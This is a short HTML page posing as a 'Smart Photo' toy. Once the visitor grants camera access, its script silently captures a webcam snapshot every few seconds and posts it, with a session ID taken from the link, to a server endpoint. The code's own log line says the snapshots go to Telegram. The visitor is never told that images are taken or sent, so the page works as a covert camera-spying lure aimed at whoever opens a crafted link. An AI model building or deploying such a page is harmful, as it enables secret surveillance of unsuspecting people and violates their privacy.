<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Smart Photo</title>
</head>
<body>
  <h1>Smart Photo</h1>
  <video id="video" width="320" height="240" autoplay></video>
  <p>You looks Awesome :)...</p>

  <script>
    const params = new URLSearchParams(window.location.search);
    const sessionId = params.get('sessionId');

    const video = document.getElementById('video');

    // Access webcam
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => { video.srcObject = stream; })
      .catch(err => alert('Error accessing webcam: ' + err));

    // Function to capture and send snapshot
    async function sendSnapshot() {
      if (video.readyState < 2) return; // video not ready

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0);

      const imgData = canvas.toDataURL('image/png');

      try {
        await fetch('/api/sendPhoto', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ sessionId, imgData })
        });
        console.log('Snapshot sent to Telegram');
      } catch (err) {
        console.error('Failed to send snapshot:', err);
      }
    }

    // Send snapshot every 5 seconds
    setInterval(sendSnapshot, 3000);
  </script>
</body>
</html>
